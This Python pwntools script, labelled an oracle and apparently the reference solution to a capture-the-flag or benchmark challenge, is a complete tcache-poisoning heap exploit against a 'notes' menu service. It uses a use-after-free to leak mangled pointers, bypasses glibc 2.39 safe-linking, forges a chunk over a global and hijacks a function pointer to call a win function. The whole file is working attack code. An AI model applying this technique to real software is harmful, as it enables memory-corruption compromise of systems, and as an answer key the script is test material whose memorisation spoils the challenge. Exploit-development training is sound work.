#!/usr/bin/env python3
"""Oracle: tcache poisoning with glibc-2.39 pointer mangling.
Protocol is digit-menu. free(c0)+show leaks fd0 = pos0>>12 (next=NULL);
free(c1)+show leaks fd1 = (pos1>>12) ^ pos0 with pos1>>12 == fd0 (adjacent,
same page) -> pos0 = fd1 ^ fd0. UAF-edit c1's fd to mangled(&g_box)
= (pos>>12) ^ target; two adds pop c1 then the fake chunk, second add writes
dispatch_win over g_box.f; menu 5 calls it."""

from pwn import ELF, context, p64, remote, u64

context.log_level = "error"
context.arch = "amd64"
e = ELF("/work/notes/notes", checksec=False)
target = e.symbols["g_box"]  # tcache stores user pointers: forge = g_box itself
win = e.symbols["dispatch_win"]
SIZE = 56  # -> chunk 0x50

r = remote("notes", 9999, timeout=10)


def add(idx, size, data):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"idx size data> ")
    r.sendline(f"{idx} {size}".encode())
    r.send(data)
    r.recvuntil(b"added")


def dele(idx):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"idx> ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"freed")


def show(idx):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"idx> ")
    r.sendline(str(idx).encode())
    return r.recvuntil(b"\nshown\n", drop=True)


def edit(idx, data):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"idx data> ")
    r.sendline(str(idx).encode())
    r.send(data)
    r.recvuntil(b"edited")


add(0, SIZE, b"A" * SIZE)
add(1, SIZE, b"B" * SIZE)
dele(0)
fd0 = u64(show(0)[:8].ljust(8, b"\x00"))
dele(1)
fd1 = u64(show(1)[:8].ljust(8, b"\x00"))
print("fd0", hex(fd0), "fd1", hex(fd1))
pos0 = fd1 ^ fd0
key = fd0  # == pos>>12 for both chunks (same page)
mangled = key ^ target
edit(1, p64(mangled).ljust(SIZE, b"\x00"))
add(2, SIZE, b"C" * SIZE)  # pops c1
add(3, SIZE, p64(win).ljust(SIZE, b"\x00"))  # pops fake, writes g_box.f
r.recvuntil(b"> ")
r.sendline(b"5")
print("pos0", hex(pos0), "target", hex(target), "win", hex(win))
print(r.recvrepeat(4))
